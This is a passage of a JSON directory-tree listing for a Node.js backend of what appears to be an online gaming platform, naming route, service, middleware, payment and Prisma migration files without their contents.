          "name": "CacheManager.js",
          "path": "src\\libs\\CacheManager.js",
          "type": "file"
        },
        {
          "name": "google",
          "path": "src\\libs\\google",
          "type": "directory",
          "children": [
            {
              "name": "dailyPushTest.js",
              "path": "src\\libs\\google\\dailyPushTest.js",
              "type": "file"
            },
            {
              "name": "example.js",
              "path": "src\\libs\\google\\example.js",
              "type": "file"
            },
            {
              "name": "FirebaseMessagingClient.js",
              "path": "src\\libs\\google\\FirebaseMessagingClient.js",
              "type": "file"
            },
            {
              "name": "GooglePushConfig.js",
              "path": "src\\libs\\google\\GooglePushConfig.js",
              "type": "file"
            },
            {
              "name": "index.js",
              "path": "src\\libs\\google\\index.js",
              "type": "file"
            },
            {
              "name": "PushNotificationManager.js",
              "path": "src\\libs\\google\\PushNotificationManager.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "HttpClient.js",
          "path": "src\\libs\\HttpClient.js",
          "type": "file"
        },
        {
          "name": "prisma.js",
          "path": "src\\libs\\prisma.js",
          "type": "file"
        },
        {
          "name": "queue",
          "path": "src\\libs\\queue",
          "type": "directory",
          "children": [
            {
              "name": "DelayQueueAbstract.js",
              "path": "src\\libs\\queue\\DelayQueueAbstract.js",
              "type": "file"
            },
            {
              "name": "index.js",
              "path": "src\\libs\\queue\\index.js",
              "type": "file"
            },
            {
              "name": "redis",
              "path": "src\\libs\\queue\\redis",
              "type": "directory",
              "children": [
                {
                  "name": "index.js",
                  "path": "src\\libs\\queue\\redis\\index.js",
                  "type": "file"
                },
                {
                  "name": "redis.md",
                  "path": "src\\libs\\queue\\redis\\redis.md",
                  "type": "file"
                },
                {
                  "name": "RedisMqDelayQueue.js",
                  "path": "src\\libs\\queue\\redis\\RedisMqDelayQueue.js",
                  "type": "file"
                }
              ]
            }
          ]
        },
        {
          "name": "Scheduler.js",
          "path": "src\\libs\\Scheduler.js",
          "type": "file"
        },
        {
          "name": "SyncManager.js",
          "path": "src\\libs\\SyncManager.js",
          "type": "file"
        },
        {
          "name": "TaskWorkflow.js",
          "path": "src\\libs\\TaskWorkflow.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "middlewares",
      "path": "src\\middlewares",
      "type": "directory",
      "children": [
        {
          "name": "auth.js",
          "path": "src\\middlewares\\auth.js",
          "type": "file"
        },
        {
          "name": "context.js",
          "path": "src\\middlewares\\context.js",
          "type": "file"
        },
        {
          "name": "error.js",
          "path": "src\\middlewares\\error.js",
          "type": "file"
        },
        {
          "name": "ip.js",
          "path": "src\\middlewares\\ip.js",
          "type": "file"
        },
        {
          "name": "ipWhiteList.js",
          "path": "src\\middlewares\\ipWhiteList.js",
          "type": "file"
        },
        {
          "name": "mch.js",
          "path": "src\\middlewares\\mch.js",
          "type": "file"
        },
        {
          "name": "pay",
          "path": "src\\middlewares\\pay",
          "type": "directory",
          "children": [
            {
              "name": "account.js",
              "path": "src\\middlewares\\pay\\account.js",
              "type": "file"
            },
            {
              "name": "channelCheck.js",
              "path": "src\\middlewares\\pay\\channelCheck.js",
              "type": "file"
            },
            {
              "name": "goods.js",
              "path": "src\\middlewares\\pay\\goods.js",
              "type": "file"
            },
            {
              "name": "ifscCheck.js",
              "path": "src\\middlewares\\pay\\ifscCheck.js",
              "type": "file"
            },
            {
              "name": "orderBuilding.js",
              "path": "src\\middlewares\\pay\\orderBuilding.js",
              "type": "file"
            },
            {
              "name": "orderFrequencyRestricted.js",
              "path": "src\\middlewares\\pay\\orderFrequencyRestricted.js",
              "type": "file"
            },
            {
              "name": "paymentCallback.js",
              "path": "src\\middlewares\\pay\\paymentCallback.js",
              "type": "file"
            },
            {
              "name": "paymentCallbackChannel.js",
              "path": "src\\middlewares\\pay\\paymentCallbackChannel.js",
              "type": "file"
            },
            {
              "name": "paymentCallbackVerify.js",
              "path": "src\\middlewares\\pay\\paymentCallbackVerify.js",
              "type": "file"
            },
            {
              "name": "paymentContext.js",
              "path": "src\\middlewares\\pay\\paymentContext.js",
              "type": "file"
            },
            {
              "name": "restrictedAreas.js",
              "path": "src\\middlewares\\pay\\restrictedAreas.js",
              "type": "file"
            },
            {
              "name": "withdrawPostProcess.js",
              "path": "src\\middlewares\\pay\\withdrawPostProcess.js",
              "type": "file"
            },
            {
              "name": "withdrawRiskCheck.js",
              "path": "src\\middlewares\\pay\\withdrawRiskCheck.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "rateLimiter.js",
          "path": "src\\middlewares\\rateLimiter.js",
          "type": "file"
        },
        {
          "name": "responseCache.js",
          "path": "src\\middlewares\\responseCache.js",
          "type": "file"
        },
        {
          "name": "s2sAuthentication.js",
          "path": "src\\middlewares\\s2sAuthentication.js",
          "type": "file"
        },
        {
          "name": "simpleSign.js",
          "path": "src\\middlewares\\simpleSign.js",
          "type": "file"
        },
        {
          "name": "sms.js",
          "path": "src\\middlewares\\sms.js",
          "type": "file"
        },
        {
          "name": "validate.js",
          "path": "src\\middlewares\\validate.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "modules",
      "path": "src\\modules",
      "type": "directory",
      "children": [
        {
          "name": "full_schema.prisma",
          "path": "src\\modules\\full_schema.prisma",
          "type": "file"
        },
        {
          "name": "migrations",
          "path": "src\\modules\\migrations",
          "type": "directory",
          "children": [
            {
              "name": "20250623161703_add_placement_domain_fields",
              "path": "src\\modules\\migrations\\20250623161703_add_placement_domain_fields",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20250623161703_add_placement_domain_fields\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20250812141152_add_ticket_record",
              "path": "src\\modules\\migrations\\20250812141152_add_ticket_record",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20250812141152_add_ticket_record\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20250826152455_add_broadcast_info",
              "path": "src\\modules\\migrations\\20250826152455_add_broadcast_info",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20250826152455_add_broadcast_info\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20250915163128_add_cmsemailstaffsetting",
              "path": "src\\modules\\migrations\\20250915163128_add_cmsemailstaffsetting",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20250915163128_add_cmsemailstaffsetting\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20251126124434_guanxi_vip_week",
              "path": "src\\modules\\migrations\\20251126124434_guanxi_vip_week",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20251126124434_guanxi_vip_week\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20251211150940_guanxi_reflux",
              "path": "src\\modules\\migrations\\20251211150940_guanxi_reflux",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20251211150940_guanxi_reflux\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20260105173319_guanxi_gameround",
              "path": "src\\modules\\migrations\\20260105173319_guanxi_gameround",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20260105173319_guanxi_gameround\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20260127143818_third_party_user",
              "path": "src\\modules\\migrations\\20260127143818_third_party_user",
              "type": "directory",
              "children": []
            }
          ]
        },
        {
          "name": "published",
          "path": "src\\modules\\published",
          "type": "directory",
          "children": [
            {
              "name": "2025061815",
              "path": "src\\modules\\published\\2025061815",
              "type": "directory",
              "children": [
                {
                  "name": "20250603110847_diff",
                  "path": "src\\modules\\published\\2025061815\\20250603110847_diff",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250603110847_diff\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250605210444_userattrib",
                  "path": "src\\modules\\published\\2025061815\\20250605210444_userattrib",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250605210444_userattrib\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250606114838_add_operation_center_r",
                  "path": "src\\modules\\published\\2025061815\\20250606114838_add_operation_center_r",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250606114838_add_operation_center_r\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250606180317_add_operation_center_r_customerId",
                  "path": "src\\modules\\published\\2025061815\\20250606180317_add_operation_center_r_customerId",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250606180317_add_operation_center_r_customerId\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250612183505_fix_all_model",
                  "path": "src\\modules\\published\\2025061815\\20250612183505_fix_all_model",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250612183505_fix_all_model\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250613161515_add_operation_center_r_customer_type",
                  "path": "src\\modules\\published\\2025061815\\20250613161515_add_operation_center_r_customer_type",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250613161515_add_operation_center_r_customer_type\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250618.sql",
                  "path": "src\\modules\\published\\2025061815\\20250618.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "2025062001",
              "path": "src\\modules\\published\\2025062001",
              "type": "directory",
              "children": [
                {
                  "name": "20250620115524_gx_transaction",
                  "path": "src\\modules\\published\\2025062001\\20250620115524_gx_transaction",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025062001\\20250620115524_gx_transaction\\migration.sql",
                      "type": "file"
                    }
                  ]
                }
              ]
            },
            {
              "name": "2025070717",
              "path": "src\\modules\\published\\2025070717",
              "type": "directory",
              "children": [
                {
                  "name": "20250613141103_add_relation_cdkcode",
                  "path": "src\\modules\\published\\2025070717\\20250613141103_add_relation_cdkcode",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025070717\\20250613141103_add_relation_cdkcode\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250722113407_guanxi_wager",
                  "path": "src\\modules\\published\\2025070717\\20250722113407_guanxi_wager",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025070717\\20250722113407_guanxi_wager\\migration.sql",
                      "type": "file"
                    }
                  ]
                }
              ]
            },
            {
              "name": "2025082917",
              "path": "src\\modules\\published\\2025082917",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\published\\2025082917\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "2025090814",
              "path": "src\\modules\\published\\2025090814",
              "type": "directory",
              "children": [
                {
                  "name": "20250829173149_wallet",
                  "path": "src\\modules\\published\\2025090814\\20250829173149_wallet",
                  "type": "directory",
                  "children": []
                }
              ]
            },
            {
              "name": "2025091615",
              "path": "src\\modules\\published\\2025091615",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\published\\2025091615\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20251010171400_guanxi_player_rank",
              "path": "src\\modules\\published\\20251010171400_guanxi_player_rank",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\published\\20251010171400_guanxi_player_rank\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "2025101614",
              "path": "src\\modules\\published\\2025101614",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\published\\2025101614\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20251215174320_guanxi_account",
              "path": "src\\modules\\published\\20251215174320_guanxi_account",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\published\\20251215174320_guanxi_account\\migration.sql",
                  "type": "file"
                }
              ]
            }
          ]
        },
        {
          "name": "schema.prisma",
          "path": "src\\modules\\schema.prisma",
          "type": "file"
        }
      ]
    },
    {
      "name": "repositories",
      "path": "src\\repositories",
      "type": "directory",
      "children": []
    },
    {
      "name": "routes",
      "path": "src\\routes",
      "type": "directory",
      "children": [
        {
          "name": "v1",
          "path": "src\\routes\\v1",
          "type": "directory",
          "children": [
            {
              "name": "advertising.route.js",
              "path": "src\\routes\\v1\\advertising.route.js",
              "type": "file"
            },
            {
              "name": "agent.route.js",
              "path": "src\\routes\\v1\\agent.route.js",
              "type": "file"
            },
            {
              "name": "announcement.route.js",
              "path": "src\\routes\\v1\\announcement.route.js",
              "type": "file"
            },
            {
              "name": "appbury.route.js",
              "path": "src\\routes\\v1\\appbury.route.js",
              "type": "file"
            },
            {
              "name": "audienceBaseConfig.route.js",
              "path": "src\\routes\\v1\\audienceBaseConfig.route.js",
              "type": "file"
            },
            {
              "name": "audienceClassification.route.js",
              "path": "src\\routes\\v1\\audienceClassification.route.js",
              "type": "file"
            },
            {
              "name": "audienceGroup.route.js",
              "path": "src\\routes\\v1\\audienceGroup.route.js",
              "type": "file"
            },
            {
              "name": "auth.route.js",
              "path": "src\\routes\\v1\\auth.route.js",
              "type": "file"
            },
            {
              "name": "banner.js",
              "path": "src\\routes\\v1\\banner.js",
              "type": "file"
            },
            {
              "name": "broadcast.route.js",
              "path": "src\\routes\\v1\\broadcast.route.js",
              "type": "file"
            },
            {
              "name": "config.route.js",
              "path": "src\\routes\\v1\\config.route.js",
              "type": "file"
            },
            {
              "name": "dailyCheckIn.route.js",
              "path": "src\\routes\\v1\\dailyCheckIn.route.js",
              "type": "file"
            },
            {
              "name": "dbSnapshot.route.js",
              "path": "src\\routes\\v1\\dbSnapshot.route.js",
              "type": "file"
            },
            {
              "name": "docs.route.js",
              "path": "src\\routes\\v1\\docs.route.js",
              "type": "file"
            },
            {
              "name": "fruitMachineDraw.route.js",
              "path": "src\\routes\\v1\\fruitMachineDraw.route.js",
              "type": "file"
            },
            {
              "name": "game",
              "path": "src\\routes\\v1\\game",
              "type": "directory",
              "children": [
                {
                  "name": "game.route.js",
                  "path": "src\\routes\\v1\\game\\game.route.js",
                  "type": "file"
                },
                {
                  "name": "provider",
                  "path": "src\\routes\\v1\\game\\provider",
                  "type": "directory",
                  "children": [
                    {
                      "name": "evo.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\evo.route.js",
                      "type": "file"
                    },
                    {
                      "name": "facai.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\facai.route.js",
                      "type": "file"
                    },
                    {
                      "name": "index.js",
                      "path": "src\\routes\\v1\\game\\provider\\index.js",
                      "type": "file"
                    },
                    {
                      "name": "inout_evo.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\inout_evo.route.js",
                      "type": "file"
                    },
                    {
                      "name": "inout_jdy.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\inout_jdy.route.js",
                      "type": "file"
                    },
                    {
                      "name": "oneapi.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\oneapi.route.js",
                      "type": "file"
                    },
                    {
                      "name": "oneapi_evo.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\oneapi_evo.route.js",
                      "type": "file"
                    },
                    {
                      "name": "pt.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\pt.route.js",
                      "type": "file"
                    }
                  ]
                }
              ]
            },
            {
              "name": "giftcode.route.js",
              "path": "src\\routes\\v1\\giftcode.route.js",
              "type": "file"
            },
            {
              "name": "googlepush.route.js",
              "path": "src\\routes\\v1\\googlepush.route.js",
              "type": "file"
            },
            {
              "name": "inactiveUser.route.js",
              "path": "src\\routes\\v1\\inactiveUser.route.js",
              "type": "file"
            },
            {
              "name": "index.js",
              "path": "src\\routes\\v1\\index.js",
              "type": "file"
            },
            {
              "name": "kefu.route.js",
              "path": "src\\routes\\v1\\kefu.route.js",
              "type": "file"
            },
            {
              "name": "lobby.route.js",
              "path": "src\\routes\\v1\\lobby.route.js",
              "type": "file"
            },
            {
              "name": "mail.route.js",
              "path": "src\\routes\\v1\\mail.route.js",
              "type": "file"
            },
            {
              "name": "online.route.js",
              "path": "src\\routes\\v1\\online.route.js",
              "type": "file"
            },
            {
              "name": "pay.route.js",
              "path": "src\\routes\\v1\\pay.route.js",
              "type": "file"
            },
            {
              "name": "playerRanking.route.js",
              "path": "src\\routes\\v1\\playerRanking.route.js",
              "type": "file"
            },
            {
              "name": "rank.route.js",
              "path": "src\\routes\\v1\\rank.route.js",
              "type": "file"
            },
            {
              "name": "rechargeOrder.route.js",
              "path": "src\\routes\\v1\\rechargeOrder.route.js",
              "type": "file"
            },
            {
              "name": "redPoint.route.js",
              "path": "src\\routes\\v1\\redPoint.route.js",
              "type": "file"
            },
            {
              "name": "slap.route.js",
              "path": "src\\routes\\v1\\slap.route.js",
              "type": "file"
            },
            {
              "name": "sms.route.js",
              "path": "src\\routes\\v1\\sms.route.js",
              "type": "file"
            },
            {
              "name": "test.route.js",
              "path": "src\\routes\\v1\\test.route.js",
              "type": "file"
            },
            {
              "name": "ticket.route.js",
              "path": "src\\routes\\v1\\ticket.route.js",
              "type": "file"
            },
            {
              "name": "turntable.route.js",
              "path": "src\\routes\\v1\\turntable.route.js",
              "type": "file"
            },
            {
              "name": "userGroup.route.js",
              "path": "src\\routes\\v1\\userGroup.route.js",
              "type": "file"
            },
            {
              "name": "userPrivacy.route.js",
              "path": "src\\routes\\v1\\userPrivacy.route.js",
              "type": "file"
            },
            {
              "name": "version.route.js",
              "path": "src\\routes\\v1\\version.route.js",
              "type": "file"
            },
            {
              "name": "vip.route.js",
              "path": "src\\routes\\v1\\vip.route.js",
              "type": "file"
            },
            {
              "name": "wallet.route.js",
              "path": "src\\routes\\v1\\wallet.route.js",
              "type": "file"
            },
            {
              "name": "withdrawOrder.route.js",
              "path": "src\\routes\\v1\\withdrawOrder.route.js",
              "type": "file"
            }
          ]
        }
      ]
    },
    {
      "name": "services",
      "path": "src\\services",
      "type": "directory",
      "children": [
        {
          "name": "advertisingReward.service.js",
          "path": "src\\services\\advertisingReward.service.js",
          "type": "file"
        },
        {
          "name": "agent",
          "path": "src\\services\\agent",
          "type": "directory",
          "children": [
            {
              "name": "agent.service.js",
              "path": "src\\services\\agent\\agent.service.js",
              "type": "file"
            },
            {
              "name": "config.js",
              "path": "src\\services\\agent\\config.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "announcement.service.js",
          "path": "src\\services\\announcement.service.js",
          "type": "file"
        },
        {
          "name": "appbury.service.js",
          "path": "src\\services\\appbury.service.js",
          "type": "file"
        },
        {
          "name": "audienceBaseConfig.service.js",
          "path": "src\\services\\audienceBaseConfig.service.js",
          "type": "file"
        },
        {
          "name": "audienceClassification.service.js",
          "path": "src\\services\\audienceClassification.service.js",
          "type": "file"
        },
        {
          "name": "audienceGroup.service.js",
          "path": "src\\services\\audienceGroup.service.js",
          "type": "file"
        },
        {
          "name": "auth.service.js",
          "path": "src\\services\\auth.service.js",
          "type": "file"
        },
        {
          "name": "banner.service.js",
          "path": "src\\services\\banner.service.js",
          "type": "file"
        },
        {
          "name": "behaviorTracking",
          "path": "src\\services\\behaviorTracking",
          "type": "directory",
          "children": [
            {
              "name": "appsFlyer.service.js",
              "path": "src\\services\\behaviorTracking\\appsFlyer.service.js",
              "type": "file"
            },
            {
              "name": "esEvent.service.js",
              "path": "src\\services\\behaviorTracking\\esEvent.service.js",
              "type": "file"
            },
            {
              "name": "facebookPixel.service.js",
              "path": "src\\services\\behaviorTracking\\facebookPixel.service.js",
              "type": "file"
            },
            {
              "name": "tracking.service.js",
              "path": "src\\services\\behaviorTracking\\tracking.service.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "broadcast.service.js",
          "path": "src\\services\\broadcast.service.js",
          "type": "file"
        },
        {
          "name": "config.service.js",
          "path": "src\\services\\config.service.js",
          "type": "file"
        },
        {
          "name": "crowd",
          "path": "src\\services\\crowd",
          "type": "directory",
          "children": [
            {
              "name": "businessStrategy.js",
              "path": "src\\services\\crowd\\businessStrategy.js",
              "type": "file"
            },
            {
              "name": "BusinessStrategyExecutor.js",
              "path": "src\\services\\crowd\\BusinessStrategyExecutor.js",
              "type": "file"
            },
            {
              "name": "components",
              "path": "src\\services\\crowd\\components",
              "type": "directory",
              "children": [
                {
                  "name": "AudienceFilter.js",
                  "path": "src\\services\\crowd\\components\\AudienceFilter.js",
                  "type": "file"
                }
              ]
            },
            {
              "name": "CrowdRule.js",
              "path": "src\\services\\crowd\\CrowdRule.js",
              "type": "file"
            },
            {
              "name": "group.js",
              "path": "src\\services\\crowd\\group.js",
              "type": "file"
            },
            {
              "name": "index.js",
              "path": "src\\services\\crowd\\index.js",
              "type": "file"
            },
            {
              "name": "RuleEngine.js",
              "path": "src\\services\\crowd\\RuleEngine.js",
              "type": "file"
            },
            {
              "name": "userAttriPipeline.js",
              "path": "src\\services\\crowd\\userAttriPipeline.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "dailyCheckIn.service.js",
          "path": "src\\services\\dailyCheckIn.service.js",
          "type": "file"
        },
        {
          "name": "dbSnapshot.service.js",
          "path": "src\\services\\dbSnapshot.service.js",
          "type": "file"
        },
        {
          "name": "fruitMachineDraw.service.js",
          "path": "src\\services\\fruitMachineDraw.service.js",
          "type": "file"
        },
        {
          "name": "game",
          "path": "src\\services\\game",
          "type": "directory",
          "children": [
            {
              "name": "clientView.service.js",
              "path": "src\\services\\game\\clientView.service.js",
              "type": "file"
            },
            {
              "name": "game.service.js",
              "path": "src\\services\\game\\game.service.js",
              "type": "file"
            },
            {
              "name": "provider",
              "path": "src\\services\\game\\provider",
              "type": "directory",
              "children": [
                {
                  "name": "evo.service.js",
                  "path": "src\\services\\game\\provider\\evo.service.js",
                  "type": "file"
                },
                {
                  "name": "facai.service.js",
                  "path": "src\\services\\game\\provider\\facai.service.js",
                  "type": "file"
                },
                {
                  "name": "inout.service.js",
                  "path": "src\\services\\game\\provider\\inout.service.js",
                  "type": "file"
                },
                {
                  "name": "oneapi.service.js",
                  "path": "src\\services\\game\\provider\\oneapi.service.js",
                  "type": "file"
                },
                {
                  "name": "pt.service.js",
                  "path": "src\\services\\game\\provider\\pt.service.js",
                  "type": "file"
                }
              ]
            }
          ]
        },
        {
          "name": "giftcode.service.js",
          "path": "src\\services\\giftcode.service.js",
          "type": "file"
        },
        {
          "name": "inactiveUser.service.js",
          "path": "src\\services\\inactiveUser.service.js",
          "type": "file"
        },
        {
          "name": "index.js",
          "path": "src\\services\\index.js",
          "type": "file"
        },
        {
          "name": "kefu.service.js",
          "path": "src\\services\\kefu.service.js",
          "type": "file"
        },
        {
          "name": "mail.service.js",
          "path": "src\\services\\mail.service.js",
          "type": "file"
        },
        {
          "name": "oneWayPush.service.js",
          "path": "src\\services\\oneWayPush.service.js",
          "type": "file"
        },
        {
          "name": "online.service.js",
          "path": "src\\services\\online.service.js",
          "type": "file"
        },
        {
          "name": "pay",
          "path": "src\\services\\pay",
          "type": "directory",
          "children": [
            {
              "name": "adapter",
              "path": "src\\services\\pay\\adapter",
              "type": "directory",
              "children": [
                {
                  "name": "Pay21Adapter.js",
                  "path": "src\\services\\pay\\adapter\\Pay21Adapter.js",
                  "type": "file"
                }
              ]
            },
            {
              "name": "config.js",
              "path": "src\\services\\pay\\config.js",
              "type": "file"
            },
            {
              "name": "goods",
              "path": "src\\services\\pay\\goods",
              "type": "directory",
              "children": [
                {
                  "name": "cash.js",
                  "path": "src\\services\\pay\\goods\\cash.js",
                  "type": "file"
                },
                {
                  "name": "cycleCard.js",
                  "path": "src\\services\\pay\\goods\\cycleCard.js",
                  "type": "file"
                }
              ]
            },
            {
              "name": "PaymentAdapter.js",
              "path": "src\\services\\pay\\PaymentAdapter.js",
              "type": "file"
            },
            {
              "name": "paymentAdapterManage.js",
              "path": "src\\services\\pay\\paymentAdapterManage.js",
              "type": "file"
            },
            {
              "name": "stat.js",
              "path": "src\\services\\pay\\stat.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "pay.service.js",
          "path": "src\\services\\pay.service.js",
          "type": "file"
        },
        {
          "name": "playerRanking.service.js",
          "path": "src\\services\\playerRanking.service.js",
          "type": "file"
        },
        {
          "name": "providers",
          "path": "src\\services\\providers",
          "type": "directory",
          "children": [
            {
              "name": "inout.provider.js",
              "path": "src\\services\\providers\\inout.provider.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "push.service.js",
          "path": "src\\services\\push.service.js",
          "type": "file"
        },
        {
          "name": "rank.service.js",
          "path": "src\\services\\rank.service.js",
          "type": "file"
        },
        {
          "name": "rechargeOrder.service.js",
          "path": "src\\services\\rechargeOrder.service.js",
          "type": "file"
        },
        {
          "name": "redPoint.service.js",
          "path": "src\\services\\redPoint.service.js",
          "type": "file"
        },
        {
          "name": "redPointBusiness.service.js",
          "path": "src\\services\\redPointBusiness.service.js",
          "type": "file"
        },
        {
          "name": "slap.service.js",
          "path": "src\\services\\slap.service.js",
          "type": "file"
        },
        {
          "name": "sms.service.js",
          "path": "src\\services\\sms.service.js",
          "type": "file"
        },
        {
          "name": "test.service.js",
          "path": "src\\services\\test.service.js",
          "type": "file"
        },
        {
          "name": "ticket",
          "path": "src\\services\\ticket",
          "type": "directory",
          "children": [
            {
              "name": "index.js",
              "path": "src\\services\\ticket\\index.js",
              "type": "file"
            },
            {
              "name": "ticketGrandScheduler.js",
              "path": "src\\services\\ticket\\ticketGrandScheduler.js",
              "type": "file"
            },
            {
              "name": "ticketMajorScheduler.js",
              "path": "src\\services\\ticket\\ticketMajorScheduler.js",
              "type": "file"
            },
            {
              "name": "ticketPoolScheduler.service.js",
              "path": "src\\services\\ticket\\ticketPoolScheduler.service.js",
              "type": "file"
            },
            {
              "name": "ticketSecondaryScheduler.js",
              "path": "src\\services\\ticket\\ticketSecondaryScheduler.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "ticket.service.js",
          "path": "src\\services\\ticket.service.js",
          "type": "file"
        },
        {
          "name": "timerTask.service.js",
          "path": "src\\services\\timerTask.service.js",
          "type": "file"
        },
        {
          "name": "token.service.js",
          "path": "src\\services\\token.service.js",
          "type": "file"
        },
        {
          "name": "transaction.service.js",
          "path": "src\\services\\transaction.service.js",
          "type": "file"
        },
        {
          "name": "turntable",
          "path": "src\\services\\turntable",
          "type": "directory",
          "children": [
            {
              "name": "review.js",
              "path": "src\\services\\turntable\\review.js",
              "type": "file"
            },
            {
              "name": "turntable.service.js",
              "path": "src\\services\\turntable\\turntable.service.js",
              "type": "file"
            },
            {
              "name": "turntableConfig.js",
              "path": "src\\services\\turntable\\turntableConfig.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "userChannel.service.js",
          "path": "src\\services\\userChannel.service.js",
          "type": "file"
        },
        {
          "name": "userGroup.service.js",
          "path": "src\\services\\userGroup.service.js",
          "type": "file"
        },
        {
          "name": "userPrivacy.service.js",
          "path": "src\\services\\userPrivacy.service.js",
          "type": "file"
        },
        {
          "name": "userSource.service.js",
          "path": "src\\services\\userSource.service.js",
          "type": "file"
        },
        {
          "name": "vip.service.js",
          "path": "src\\services\\vip.service.js",
          "type": "file"
        },
        {
          "name": "visualTemplate.service.js",
          "path": "src\\services\\visualTemplate.service.js",
          "type": "file"
        },
        {
          "name": "wallet.service.js",
          "path": "src\\services\\wallet.service.js",
          "type": "file"
        },
        {
          "name": "withdrawOrder.service.js",
          "path": "src\\services\\withdrawOrder.service.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "tests",
      "path": "src\\tests",
      "type": "directory",
      "children": [
        {
          "name": "game.test.js",
          "path": "src\\tests\\game.test.js",
          "type": "file"
        },
        {
          "name": "gameRecord.test.js",
          "path": "src\\tests\\gameRecord.test.js",
          "type": "file"
        },
        {
          "name": "inactive-users-example.js",
          "path": "src\\tests\\inactive-users-example.js",
          "type": "file"
        },
        {
          "name": "inout.test.js",
          "path": "src\\tests\\inout.test.js",
          "type": "file"
        },
        {
          "name": "iopush.server.examples.js",
          "path": "src\\tests\\iopush.server.examples.js",
          "type": "file"
        },
        {
          "name": "iopush.service.enhanced.js",
          "path": "src\\tests\\iopush.service.enhanced.js",
          "type": "file"
        },
        {
          "name": "iopush.test.client.clean.js",
          "path": "src\\tests\\iopush.test.client.clean.js",
          "type": "file"
        },
        {
          "name": "pure.websocket.example.js",
          "path": "src\\tests\\pure.websocket.example.js",
          "type": "file"
        },
        {
          "name": "pushListener.js",
          "path": "src\\tests\\pushListener.js",
          "type": "file"
        },
        {
          "name": "pushTest.js",
          "path": "src\\tests\\pushTest.js",
          "type": "file"
        },
        {
          "name": "pushTestSimple.js",
          "path": "src\\tests\\pushTestSimple.js",
          "type": "file"
        },
        {
          "name": "scheduler.test.js",
          "path": "src\\tests\\scheduler.test.js",
          "type": "file"
        },
        {
          "name": "socket",
          "path": "src\\tests\\socket",
          "type": "directory",
          "children": [
            {
              "name": "iopush.service.back.js",
              "path": "src\\tests\\socket\\iopush.service.back.js",
              "type": "file"
            },
            {
              "name": "iopush.service.pure.websocket.js",
              "path": "src\\tests\\socket\\iopush.service.pure.websocket.js",
              "type": "file"
            },
            {
              "name": "iopush.service.websocket.enhanced.js",
              "path": "src\\tests\\socket\\iopush.service.websocket.enhanced.js",
              "type": "file"
            },
            {
              "name": "README.pure.websocket.md",
